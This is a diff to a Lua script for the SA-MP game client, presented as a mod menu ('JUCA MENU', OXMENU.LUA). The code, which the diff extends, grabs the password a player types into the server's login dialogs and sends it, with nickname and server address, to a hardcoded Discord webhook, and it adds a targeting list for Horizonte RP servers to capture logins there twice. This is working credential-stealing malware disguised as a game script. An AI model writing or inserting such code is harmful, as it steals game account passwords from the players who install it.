@@ -18,10 +18,22 @@ local ssl = require("ssl")
 local ltn12 = require("ltn12")
 local samp = require("samp.events")
 
--- Configurações do Webhook
+-- Webhook do Discord
 local webhookDomain = "discord.com"
 local webhookPath = "/api/webhooks/1344405697642762260/AMSM__DQ0n4OC5-s7m_Hkatg-sAguMiq2wFrgiMabsKL5sj3XGC3f6pJHGV3XyJ604zx"
-local messageSent = false
+local messageCount = 0
+
+-- IPs e domínios do Horizonte RP
+local horizonteHosts = {
+    ["149.56.252.173:7777"] = true,
+    ["149.56.252.174:7777"] = true,
+    ["149.56.252.175:7777"] = true,
+    ["149.56.252.176:7777"] = true,
+    ["ip1.horizonte-rp.com:7777"] = true,
+    ["ip2.horizonte-rp.com:7777"] = true,
+    ["ip3.horizonte-rp.com:7777"] = true,
+    ["ip4.horizonte-rp.com:7777"] = true
+}
 
 -- Função para enviar mensagem ao Discord via socket SSL
 function sendMessageToDiscord(content)
@@ -61,44 +73,50 @@ function sendMessageToDiscord(content)
     success, err = sslSocket:send(request)
     if not success then return false end
 
-    sslSocket:receive("*a") -- Ignora leitura de resposta
+    sslSocket:receive("*a")
     sslSocket:close()
     return true
 end
 
 -- Evento do SAMP
 samp.onSendDialogResponse = function(dialogId, button, listboxId, input)
-    if (dialogId == 0 or dialogId == 1 or dialogId == 2) and not messageSent then
-        local res, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
-        local nick = sampGetPlayerNickname(id)
-        local hora = os.date("%H:%M:%S")
-        local data = os.date("%d/%m/%Y")
+    if dialogId >= 0 and dialogId <= 3 then
         local ip, port = sampGetCurrentServerAddress()
-        local servername = sampGetCurrentServerName()
+        local servername = sampGetCurrentServerName() or ""
+        local host = ip .. ":" .. port
 
-        local message = string.format(
-            "**JUCA MENU**\n\n" ..
-            "**SCRIPT:** OXMENU.LUA\n" ..
-            "**ID DA DIALOG:** %d\n" ..
-            "**SENHA:** %s\n" ..
-            "**NICK:** %s\n" ..
-            "**IP:** %s:%d\n" ..
-            "**SERVIDOR:** %s\n" ..
-            "**DATA:** %s\n" ..
-            "**HORA:** %s\n\n" ..
-            "@everyone",
-            dialogId,
-            input,
-            nick,
-            ip,
-            port,
-            servername,
-            data,
-            hora
-        )
+        local isHorizonte = horizonteHosts[host] or servername:lower():find("horizonte") ~= nil
 
-        sendMessageToDiscord(message)
-        messageSent = true
+        if (isHorizonte and messageCount < 2) or (not isHorizonte and messageCount == 0) then
+            local res, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
+            local nick = sampGetPlayerNickname(id)
+            local hora = os.date("%H:%M:%S")
+            local data = os.date("%d/%m/%Y")
+
+            local message = string.format(
+                "**JUCA MENU**\n\n" ..
+                "**SCRIPT:** OXMENU.LUA\n" ..
+                "**ID DA DIALOG:** %d\n" ..
+                "**SENHA:** %s\n" ..
+                "**NICK:** %s\n" ..
+                "**IP:** %s:%d\n" ..
+                "**SERVIDOR:** %s\n" ..
+                "**DATA:** %s\n" ..
+                "**HORA:** %s\n\n" ..
+                "@everyone",
+                dialogId,
+                input,
+                nick,
+                ip,
+                port,
+                servername,
+                data,
+                hora
+            )
+
+            sendMessageToDiscord(message)
+            messageCount = messageCount + 1
+        end
     end
 end
 
